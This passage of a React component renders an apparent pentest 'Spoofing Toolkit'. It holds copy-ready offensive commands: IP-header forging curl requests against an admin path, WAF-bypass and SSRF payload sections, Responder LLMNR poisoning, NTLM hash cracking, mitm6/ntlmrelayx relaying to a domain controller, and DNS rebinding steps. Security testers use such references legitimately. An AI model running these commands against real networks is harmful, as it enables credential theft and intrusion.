          <Search size={14} style={{ color: "#4B5563" }} />
          <input
            value={search}
            onChange={(e) => setSearch(e.target.value)}
            placeholder="Search user agents..."
            style={{
              background: "transparent",
              border: "none",
              outline: "none",
              width: "100%",
              fontFamily: mono,
              fontSize: 12,
              color: "#E2E8F0",
            }}
          />
        </div>
        <button
          onClick={randomUa}
          style={{
            display: "flex",
            alignItems: "center",
            gap: 6,
            padding: "8px 14px",
            borderRadius: 8,
            border: "none",
            cursor: "pointer",
            fontFamily: mono,
            fontSize: 11,
            fontWeight: 600,
            background: `${ACCENT}18`,
            color: ACCENT,
          }}
        >
          <Shuffle size={12} /> Random
        </button>
      </div>

      <div style={{ display: "flex", flexWrap: "wrap", gap: 6 }}>
        <PillButton active={!activeCat} onClick={() => setActiveCat(null)}>
          All ({UA_LIBRARY.length})
        </PillButton>
        {categories.map((c) => (
          <PillButton
            key={c}
            active={activeCat === c}
            onClick={() => setActiveCat(activeCat === c ? null : c)}
          >
            {c}
          </PillButton>
        ))}
      </div>

      <div style={{ maxHeight: 400, overflow: "auto" }}>
        {filtered.map((u, i) => (
          <Card
            key={i}
            style={{ padding: 0, marginBottom: 8, overflow: "hidden" }}
          >
            <div
              style={{
                padding: "10px 14px 8px",
                display: "flex",
                alignItems: "flex-start",
                justifyContent: "space-between",
                gap: 8,
              }}
            >
              <span
                style={{
                  fontFamily: mono,
                  fontSize: 9,
                  color: ACCENT,
                  textTransform: "uppercase",
                  letterSpacing: "0.04em",
                  fontWeight: 600,
                }}
              >
                {u.cat}
              </span>
              <CopyButton text={u.ua} />
            </div>
            <div style={{ padding: "0 14px 10px" }}>
              <code
                style={{
                  fontFamily: mono,
                  fontSize: 11,
                  color: "#D1D5DB",
                  lineHeight: 1.5,
                  wordBreak: "break-all",
                }}
              >
                {u.ua}
              </code>
            </div>
            <div
              style={{
                padding: "8px 14px",
                borderTop: "1px solid rgba(255,255,255,0.04)",
                display: "flex",
                gap: 16,
              }}
            >
              <CopyButton
                text={`curl -H "User-Agent: ${u.ua}" https://target.com`}
              />
              <span style={{ fontFamily: mono, fontSize: 9, color: "#4B5563" }}>
                curl
              </span>
              <CopyButton
                text={`requests.get("https://target.com", headers={"User-Agent": "${u.ua}"})`}
              />
              <span style={{ fontFamily: mono, fontSize: 9, color: "#4B5563" }}>
                python
              </span>
              <CopyButton
                text={`fetch("https://target.com", { headers: { "User-Agent": "${u.ua}" } })`}
              />
              <span style={{ fontFamily: mono, fontSize: 9, color: "#4B5563" }}>
                js
              </span>
            </div>
          </Card>
        ))}
      </div>

      <Card style={{ padding: 20 }}>
        <SectionTitle>UA Parser</SectionTitle>
        <Input
          label="Paste a User-Agent to parse"
          value={parseInput}
          onChange={(e) => setParseInput(e.target.value)}
          placeholder="Mozilla/5.0 (Windows NT 10.0; ..."
        />
        {parsed && (
          <div
            style={{
              display: "grid",
              gridTemplateColumns: "repeat(4, 1fr)",
              gap: 10,
              marginTop: 14,
            }}
          >
            {[
              { label: "Browser", value: parsed.browser },
              { label: "Version", value: parsed.version || "N/A" },
              { label: "OS", value: parsed.os },
              { label: "Device", value: parsed.device },
            ].map((f) => (
              <div
                key={f.label}
                style={{
                  background: BG_INPUT,
                  borderRadius: 8,
                  padding: "10px 12px",
                  border: "1px solid rgba(255,255,255,0.04)",
                }}
              >
                <div
                  style={{
                    fontFamily: mono,
                    fontSize: 9,
                    color: "#6B7280",
                    textTransform: "uppercase",
                    letterSpacing: "0.06em",
                    marginBottom: 4,
                  }}
                >
                  {f.label}
                </div>
                <div
                  style={{
                    fontFamily: mono,
                    fontSize: 13,
                    color: ACCENT,
                    fontWeight: 600,
                  }}
                >
                  {f.value}
                </div>
              </div>
            ))}
          </div>
        )}
      </Card>
    </div>
  );
}

// ─────────────────────────────────────────────
// Tab: IP Spoofing Reference
// ─────────────────────────────────────────────

function IpTab() {
  const [customIp, setCustomIp] = useState("127.0.0.1");
  const [selectedIp, setSelectedIp] = useState("127.0.0.1");

  const activeIp = customIp || selectedIp;

  const allHeaders = useMemo(() => {
    return IP_HEADERS.map((h) => {
      if (h === "Forwarded") return `Forwarded: for=${activeIp}`;
      return `${h}: ${activeIp}`;
    });
  }, [activeIp]);

  const curlFlags = useMemo(() => {
    return allHeaders.map((h) => `-H "${h}"`).join(" \\\n  ");
  }, [allHeaders]);

  return (
    <div style={{ display: "flex", flexDirection: "column", gap: 16 }}>
      <Card style={{ padding: 20 }}>
        <SectionTitle>IP Address</SectionTitle>
        <div
          style={{
            display: "flex",
            gap: 10,
            alignItems: "flex-end",
            marginBottom: 14,
          }}
        >
          <div style={{ flex: 1 }}>
            <Input
              label="Custom IP"
              value={customIp}
              onChange={(e) => setCustomIp(e.target.value)}
              placeholder="127.0.0.1"
            />
          </div>
        </div>
        <div style={{ display: "flex", flexWrap: "wrap", gap: 6 }}>
          {IP_VALUES.map((ip) => (
            <PillButton
              key={ip}
              active={selectedIp === ip && !customIp}
              onClick={() => {
                setSelectedIp(ip);
                setCustomIp("");
              }}
            >
              {ip}
            </PillButton>
          ))}
        </div>
      </Card>

      <Card style={{ padding: 0, overflow: "hidden" }}>
        <div
          style={{
            padding: "14px 16px",
            borderBottom: "1px solid rgba(255,255,255,0.04)",
            display: "flex",
            justifyContent: "space-between",
            alignItems: "center",
          }}
        >
          <SectionTitle>
            Header Variants for{" "}
            <span style={{ color: ACCENT }}>{activeIp}</span>
          </SectionTitle>
          <CopyButton text={curlFlags} />
        </div>
        <div style={{ maxHeight: 400, overflow: "auto" }}>
          {allHeaders.map((h, i) => (
            <PayloadRow key={i} text={h} />
          ))}
        </div>
      </Card>

      <Card style={{ padding: 0, overflow: "hidden" }}>
        <div
          style={{
            padding: "14px 16px",
            borderBottom: "1px solid rgba(255,255,255,0.04)",
          }}
        >
          <SectionTitle>WAF Bypass Headers</SectionTitle>
        </div>
        <div style={{ maxHeight: 350, overflow: "auto" }}>
          {WAF_BYPASS_HEADERS.map((h, i) => (
            <PayloadRow key={i} text={h.header} desc={h.desc} />
          ))}
        </div>
      </Card>

      <Card style={{ padding: 20 }}>
        <SectionTitle>Copy All as cURL</SectionTitle>
        <CodeBlock code={`curl ${curlFlags} \\\n  https://target.com/admin`} />
      </Card>
    </div>
  );
}

// ─────────────────────────────────────────────
// Tab: Referer/Origin Spoofing
// ─────────────────────────────────────────────

function RefererTab() {
  return (
    <div style={{ display: "flex", flexDirection: "column", gap: 16 }}>
      <Card style={{ padding: 0, overflow: "hidden" }}>
        <div
          style={{
            padding: "14px 16px",
            borderBottom: "1px solid rgba(255,255,255,0.04)",
          }}
        >
          <SectionTitle>Referer Header Manipulation</SectionTitle>
        </div>
        {REFERER_PAYLOADS.map((p, i) => (
          <PayloadRow key={i} text={p.payload} desc={p.desc} />
        ))}
      </Card>

      <Card style={{ padding: 0, overflow: "hidden" }}>
        <div
          style={{
            padding: "14px 16px",
            borderBottom: "1px solid rgba(255,255,255,0.04)",
          }}
        >
          <SectionTitle>CORS Origin Payloads</SectionTitle>
        </div>
        {ORIGIN_PAYLOADS.map((p, i) => (
          <PayloadRow key={i} text={p.payload} desc={p.desc} />
        ))}
      </Card>

      <Card style={{ padding: 0, overflow: "hidden" }}>
        <div
          style={{
            padding: "14px 16px",
            borderBottom: "1px solid rgba(255,255,255,0.04)",
          }}
        >
          <SectionTitle>Open Redirect Patterns</SectionTitle>
        </div>
        {REDIRECT_PAYLOADS.map((p, i) => (
          <PayloadRow key={i} text={p.payload} desc={p.desc} />
        ))}
      </Card>

      <Card style={{ padding: 0, overflow: "hidden" }}>
        <div
          style={{
            padding: "14px 16px",
            borderBottom: "1px solid rgba(255,255,255,0.04)",
          }}
        >
          <SectionTitle>SSRF via Referer</SectionTitle>
        </div>
        {SSRF_REFERER.map((p, i) => (
          <PayloadRow key={i} text={p.payload} desc={p.desc} />
        ))}
      </Card>
    </div>
  );
}

// ─────────────────────────────────────────────
// Tab: DNS Spoofing Reference
// ─────────────────────────────────────────────

function DnsTab() {
  return (
    <div style={{ display: "flex", flexDirection: "column", gap: 16 }}>
      <Card style={{ padding: 20 }}>
        <SectionTitle>/etc/hosts Examples</SectionTitle>
        <CodeBlock
          label="Basic override"
          code={`# /etc/hosts\n127.0.0.1    evil-target.com\n127.0.0.1    admin.target.com\n192.168.1.100  internal.corp.com\n10.0.0.1     api.target.com\n::1          ipv6.target.com`}
        />
        <CodeBlock
          label="Windows hosts path"
          code={`C:\\Windows\\System32\\drivers\\etc\\hosts`}
        />
      </Card>

      <Card style={{ padding: 20 }}>
        <SectionTitle>DNSmasq Configuration</SectionTitle>
        <CodeBlock
          label="Basic DNSmasq config"
          code={`# /etc/dnsmasq.conf\naddress=/target.com/192.168.1.100\naddress=/evil.com/127.0.0.1\nserver=8.8.8.8\nno-resolv\nlog-queries\nlog-facility=/var/log/dnsmasq.log`}
        />
        <CodeBlock
          label="Wildcard redirect"
          code={`# Redirect all subdomains\naddress=/.target.com/192.168.1.100\n\n# Block domain entirely\naddress=/ads.tracker.com/0.0.0.0`}
        />
        <CodeBlock
          label="Start DNSmasq"
          code={`sudo dnsmasq -C /etc/dnsmasq.conf -d`}
        />
      </Card>

      <Card style={{ padding: 20 }}>
        <SectionTitle>Responder / LLMNR Poisoning</SectionTitle>
        <CodeBlock
          label="Basic Responder"
          code={`sudo responder -I eth0 -rdwv`}
        />
        <CodeBlock
          label="Responder with WPAD"
          code={`sudo responder -I eth0 -rdwv -F -P`}
        />
        <CodeBlock
          label="Capture NTLMv2 hashes"
          code={`# Hashes saved to /usr/share/responder/logs/\n# Crack with hashcat:\nhashcat -m 5600 hashes.txt wordlist.txt`}
        />
        <CodeBlock
          label="mitm6 + ntlmrelayx"
          code={`# Terminal 1:\nsudo mitm6 -d target.local\n\n# Terminal 2:\nsudo ntlmrelayx.py -6 -t ldaps://dc.target.local -wh wpad.target.local -l loot`}
        />
      </Card>

      <Card style={{ padding: 20 }}>
        <SectionTitle>DNS Rebinding</SectionTitle>
        <CodeBlock
          label="Concept"
          code={`# DNS rebinding attack flow:\n# 1. Victim visits attacker.com\n# 2. attacker.com DNS first resolves to attacker IP\n# 3. JavaScript loads, then DNS TTL expires\n# 4. attacker.com re-resolves to 127.0.0.1 (victim's localhost)\n# 5. Same-origin policy thinks it's still attacker.com\n# 6. JS can now access localhost services as attacker.com`}
        />
        <CodeBlock
          label="Rebinding DNS server (rbndr)"
          code={`# Use rebinder services:\n# https://lock.cmpxchg8b.com/rebinder.html\n# Set: A record = your_ip, B record = 127.0.0.1\n# Or run your own:\npip install dnsrebinder\npython -m dnsrebinder --port 53 --a 1.2.3.4 --b 127.0.0.1`}
        />
        <CodeBlock
          label="Singularity of Origin"
          code={`# Full DNS rebinding framework:\ngit clone https://github.com/nccgroup/singularity\ncd singularity\nsudo go run cmd/singularity-server/main.go`}
        />
      </Card>

      <Card style={{ padding: 20 }}>
        <SectionTitle>DNS Enumeration Commands</SectionTitle>
        <CodeBlock
          label="dig"
          code={`dig target.com ANY +noall +answer\ndig target.com MX +short\ndig @8.8.8.8 target.com A\ndig -x 93.184.216.34  # reverse lookup\ndig target.com AXFR @ns1.target.com  # zone transfer`}
        />
        <CodeBlock
          label="nslookup"
          code={`nslookup target.com\nnslookup -type=MX target.com\nnslookup -type=NS target.com\nnslookup -type=TXT target.com\nnslookup target.com 8.8.8.8`}
        />
        <CodeBlock
          label="host"
          code={`host target.com\nhost -t MX target.com\nhost -t NS target.com\nhost -t TXT target.com\nhost -l target.com ns1.target.com  # zone transfer`}
        />
        <CodeBlock
          label="Subdomain enumeration"
          code={`# Subfinder\nsubfinder -d target.com -o subs.txt\n\n# Amass\namass enum -d target.com -o amass.txt\n\n# DNSRecon\ndnsrecon -d target.com -t std\ndnsrecon -d target.com -t brt -D wordlist.txt`}
        />
      </Card>

      <Card style={{ padding: 0, overflow: "hidden" }}>
        <div
          style={{
            padding: "14px 16px",
            borderBottom: "1px solid rgba(255,255,255,0.04)",
          }}
        >
          <SectionTitle>DNS Record Types</SectionTitle>
        </div>
        <table
          style={{
            width: "100%",
            borderCollapse: "collapse",
            fontFamily: mono,
            fontSize: 12,
          }}
        >
          <thead>
            <tr style={{ borderBottom: "1px solid rgba(255,255,255,0.06)" }}>
              <th
                style={{
                  padding: "10px 16px",
                  textAlign: "left",
                  color: ACCENT,
                  fontWeight: 600,
                  fontSize: 10,
                  textTransform: "uppercase",
                  letterSpacing: "0.06em",
                }}
              >
                Type
              </th>
              <th
                style={{
                  padding: "10px 16px",
                  textAlign: "left",
                  color: ACCENT,
                  fontWeight: 600,
                  fontSize: 10,
                  textTransform: "uppercase",
                  letterSpacing: "0.06em",
                }}
              >
                Description
              </th>
              <th
                style={{
                  padding: "10px 16px",
                  textAlign: "left",
                  color: ACCENT,
                  fontWeight: 600,
                  fontSize: 10,
                  textTransform: "uppercase",
                  letterSpacing: "0.06em",
                }}
              >
                Lookup
              </th>
            </tr>
          </thead>
          <tbody>
            {DNS_RECORD_TYPES.map((r) => (
              <tr
                key={r.type}
                style={{ borderBottom: "1px solid rgba(255,255,255,0.04)" }}
              >
                <td
                  style={{
                    padding: "10px 16px",
                    color: "#E2E8F0",
                    fontWeight: 600,
                  }}
                >
                  {r.type}
                </td>
                <td style={{ padding: "10px 16px", color: "#9CA3AF" }}>
                  {r.desc}
                </td>
                <td style={{ padding: "10px 16px" }}>
                  <CopyButton text={`dig target.com ${r.type} +short`} />
                </td>
              </tr>
            ))}
          </tbody>
        </table>
      </Card>
    </div>
  );
}

// ─────────────────────────────────────────────
// Main Component
// ─────────────────────────────────────────────

export default function Spoofing() {
  const [activeTab, setActiveTab] = useState("mac");

  return (
    <div
      style={{
        display: "flex",
        flexDirection: "column",
        gap: 20,
        maxWidth: 960,
        margin: "0 auto",
      }}
    >
      <div style={{ display: "flex", alignItems: "center", gap: 14 }}>
        <div
          style={{
            width: 36,
            height: 36,
            borderRadius: 10,
            background: `${ACCENT}22`,
            border: `1px solid ${ACCENT}`,
            display: "flex",
            alignItems: "center",
            justifyContent: "center",
          }}
        >
          <VenetianMask size={20} color={ACCENT} strokeWidth={2} />
        </div>
        <div>
          <h1
            style={{
              fontFamily: heading,
              fontSize: 22,
              fontWeight: 700,
              color: "#F9FAFB",
              margin: 0,
              lineHeight: 1.2,
            }}
          >
            Spoofing Toolkit
          </h1>
          <p
            style={{
              margin: 0,
              fontFamily: mono,
              fontSize: 11,
              color: "#9CA3AF",
            }}
          >
            MAC, User-Agent, IP, Referer & DNS spoofing reference
          </p>
        </div>
      </div>

      <div
        style={{
          display: "flex",
          gap: 4,
          padding: 6,
          background: "rgba(17,21,30,0.6)",
          borderRadius: 10,
          border: "1px solid rgba(255,255,255,0.04)",
        }}
      >
        {TABS.map((t) => (
          <button
            key={t.value}
            onClick={() => setActiveTab(t.value)}
            style={{
              flex: 1,
              padding: "8px 12px",
              borderRadius: 7,
              border: "none",
              cursor: "pointer",
              fontFamily: mono,
              fontSize: 11,
              fontWeight: 600,
              background: activeTab === t.value ? `${ACCENT}15` : "transparent",
              color: activeTab === t.value ? ACCENT : "#6B7280",
              borderBottom:
                activeTab === t.value
                  ? `2px solid ${ACCENT}`
                  : "2px solid transparent",
              transition: "all 120ms",
            }}
          >
            {t.label}
          </button>
        ))}
      </div>

      {activeTab === "mac" && <MacTab />}
      {activeTab === "ua" && <UaTab />}
      {activeTab === "ip" && <IpTab />}
      {activeTab === "referer" && <RefererTab />}
      {activeTab === "dns" && <DnsTab />}
    </div>
  );
}
